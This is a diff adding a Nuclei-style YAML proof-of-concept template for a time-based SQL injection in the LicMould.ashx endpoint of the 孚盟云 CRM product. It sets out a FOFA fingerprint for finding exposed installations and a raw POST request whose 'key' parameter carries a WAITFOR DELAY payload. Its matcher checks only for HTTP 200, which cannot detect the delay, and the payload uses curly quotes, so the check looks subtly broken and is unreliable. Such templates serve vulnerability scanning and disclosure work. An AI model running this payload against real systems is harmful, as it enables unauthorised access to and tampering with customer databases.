@@ -1,0 +1,27 @@
+id: poc-up0mc3bbztk9qol8
+info:
+  name: 孚盟云CRM LicMould.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/up0mc3bbztk9qol8'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: up0mc3bbztk9qol8
+    fofa: app=”孚盟软件-孚盟云”
+http:
+- raw:
+  - 'POST /Ajax/LicMould.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 123
+
+    action=DeleteEmp&key=1%20WAITFOR%20DELAY%20’0:0:5′–&fuids=abc,def,'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
